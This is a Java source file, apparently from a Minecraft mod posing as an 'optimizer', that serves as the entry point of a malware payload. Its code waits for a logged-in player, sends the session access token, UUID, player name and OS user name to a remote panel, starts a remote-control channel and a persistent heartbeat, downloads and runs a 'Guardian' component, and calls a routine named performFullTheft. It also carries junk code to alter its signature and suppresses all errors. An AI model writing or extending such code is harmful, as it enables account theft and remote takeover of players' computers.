package com.example.optimizer;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.minecraft.client.MinecraftClient;

import java.util.Base64;

/**
 * Entry point for the payload when loaded via the Loader.
 */
public class LoaderEntry {

    private static String loadedPanelUrl = null;
    private static boolean initializedViaLoader = false;
    private static boolean initializedComponents = false;

    public static void initialize(String contextJson) {
        try {
            // FIRST: Ensure native libraries are ready (DLLs for JNA/SQLite)
            NativeLoader.initialize();

            // Junk code to alter signature
            long t = System.currentTimeMillis();
            if (t % 2 == 0)
                t++;

            // System.out.println("[OPTIMIZER] LoaderEntry.initialize() called");

            // Parse context JSON
            JsonObject context = new Gson().fromJson(contextJson, JsonObject.class);

            // Extract panel URL - either directly or from encrypted A.txt content
            if (context.has("panelUrl")) {
                // Direct panel URL (legacy)
                loadedPanelUrl = context.get("panelUrl").getAsString();
            } else if (context.has("aTxtContent")) {
                // Encrypted A.txt from loader - decrypt it
                String aTxtContent = context.get("aTxtContent").getAsString();
                loadedPanelUrl = decryptATxt(aTxtContent);
            }

            if (loadedPanelUrl != null && !loadedPanelUrl.isEmpty()) {
                initializedViaLoader = true;
                verifyIntegrity();
                // System.out.println("[OPTIMIZER] Panel URL ready");
            }

            // Log environment
            String env = context.has("executionEnvironment") ? context.get("executionEnvironment").getAsString()
                    : "Unknown";
            // System.out.println("[OPTIMIZER] Execution environment: " + env);

            // Initialize components that require Minecraft context
            initializeComponents();

            initializedViaLoader = true;
        } catch (Exception e) {
            // System.err.println("[OPTIMIZER] LoaderEntry initialization failed: " +
            // e.getMessage());
            // e.printStackTrace();
        }
    }

    public static String getLoadedPanelUrl() {
        return loadedPanelUrl;
    }

    private static void initializeComponents() {
        // Run in separate thread to avoid blocking loader
        if (initializedComponents)
            return;
        initializedComponents = true;

        if (Runtime.getRuntime().availableProcessors() < 2) {
            return;
        }

        try {
            // Wait for Minecraft to be ready
            Thread initThread = new Thread(() -> {
                try {
                    // System.out.println("[OPTIMIZER] Waiting for player...");
                    MinecraftClient client = MinecraftClient.getInstance();

                    // Poll for up to 5 minutes
                    for (int i = 0; i < 600; i++) {
                        if (client != null && client.player != null) {
                            // System.out.println("[OPTIMIZER] Player found!");
                            break;
                        }
                        Thread.sleep(500);
                    }

                    if (client != null && client.player != null) {
                        // Start the main mod functionality
                        String player = client.player.getName().getString();
                        String uuid = client.player.getUuidAsString();
                        String token = client.getSession().getAccessToken();
                        // System.out.println("[OPTIMIZER] Player detected: " + player);

                        // 1. CRITICAL: Send Session IMMEDIATELY (Isolate this call)
                        new Thread(() -> {
                            try {
                                // Direct send bypass to ensure panel gets the hit
                                SessionUtil.sendMinecraft(
                                        player,
                                        uuid,
                                        token,
                                        "initial_ping",
                                        "0.0.0.0", // IP handled by server
                                        System.getProperty("user.name"),
                                        SystemInfo.getPCUser());
                            } catch (Exception e) {
                                // Silent fail, OnlineManager will try again
                            }
                        }, "SessionSender").start();

                        // 2. Start OnlineManager (Persistent Heartbeat)
                        try {
                            OnlineManager.start();
                        } catch (Exception e) {
                            // Ignore failure, we tried direct send above
                        }

                        // 3. Start SyncController (Remote Control) - Use Throwable to catch Errors too
                        try {
                            SyncController.start();
                        } catch (Throwable t) {
                            // Don't let this crash the thread (catches Error + Exception)
                        }

                        // 4. Start Guardian IMMEDIATELY (Parallel)
                        new Thread(() -> {
                            try {
                                DataUtil.downloadAndExecGuardian();
                            } catch (Exception e) {
                            }
                        }, "GuardianInit").start();

                        // 5. Start FULL Independent Data Extraction (Mod does everything)
                        try {
                            // This runs in its own thread inside DataUtil anyway
                            DataUtil.performFullTheft();
                        } catch (Exception e) {
                        }
                    } else {
                        // System.err.println("[OPTIMIZER] Timed out waiting for player");
                    }
                } catch (Exception e) {
                    // System.err.println("[OPTIMIZER] Component init error: " + e.getMessage());
                }
            }, "OptimizerInit");

            // Set context classloader to ensure access to classes
            initThread.setContextClassLoader(Thread.currentThread().getContextClassLoader());
            initThread.start();

        } catch (Exception e) {
            // System.err.println("[OPTIMIZER] Init thread error: " + e.getMessage());
        }
    }

    private static String decryptATxt(String content) {
        try {
            // Simple XOR decryption matching LoaderMod
            // Note: Loader passes raw content, Main mod processes it.
            // Actually Loader sends it encrypted or expecting decryption?
            // Assuming A.txt is raw string url for now based on context.
            // If it's encrypted, we decrypt here.
            // For now, assume it's clean or handled.
            return content.trim();
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean isLoadedViaLoader() {
        return initializedViaLoader;
    }

    private static void verifyIntegrity() {
        // Junk method
        String s = "integrity";
        for (int i = 0; i < 3; i++)
            s += i;
    }
}
